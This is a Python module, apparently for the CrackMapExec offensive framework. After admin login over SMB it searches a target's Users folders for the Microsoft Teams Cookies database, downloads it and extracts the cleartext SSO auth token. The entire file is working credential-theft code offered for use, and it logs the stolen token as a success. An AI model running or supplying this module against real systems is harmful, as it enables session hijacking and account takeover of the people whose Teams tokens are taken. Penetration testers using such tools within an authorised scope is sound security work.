#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import urllib.parse
import sqlite3

class CMEModule:

    name = 'teams_localdb'
    description = "Retrieves the cleartext ssoauthcookie from the local Microsoft Teams database"
    supported_protocols = ['smb']
    opsec_safe = False
    multiple_hosts = True

    def options(self, context, module_options):
        '''
        '''

    def on_admin_login(self, context, connection):
        paths = connection.spider('C$', folder='Users', regex=['^Cookies$'])
        for path in paths:
            if "/AppData/Roaming/Microsoft/Teams" in path:
                f = open("cookies.txt", "wb")
                try:
                    connection.conn.getFile('C$', path, f.write)
                    self.parse_file(context)
                except Exception as e:
                    context.log.error(str(e))
                    context.log.error('Cannot retrieve file, most likely Teams is running which prevents us from retrieving the Cookies database')

    @staticmethod
    def parse_file(context):
        try:
            conn = sqlite3.connect('cookies.txt')
            c = conn.cursor()
            c.execute("SELECT value FROM cookies WHERE name = 'authtoken'")
            row = c.fetchone()
            if row == None:
                context.log.error("No ssoauthcookie present in Microsoft Teams Cookies database")
            else:
                context.log.success("Succesfully extracted ssoauthcookie: " + urllib.parse.unquote(row[0]).split('=')[1].split('&')[0])
            conn.close()
        except Exception as e:
            context.log.error(str(e))
